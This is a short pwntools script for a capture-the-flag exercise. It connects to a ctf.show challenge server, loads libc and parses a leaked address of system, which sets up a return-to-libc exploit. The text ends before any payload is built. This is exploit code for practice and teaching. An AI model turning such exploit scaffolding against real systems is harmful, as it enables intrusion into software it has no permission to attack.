from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28163)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io.recvuntil("Maybe it's simple,O.o\n")
system = int(io.recvline(),16)
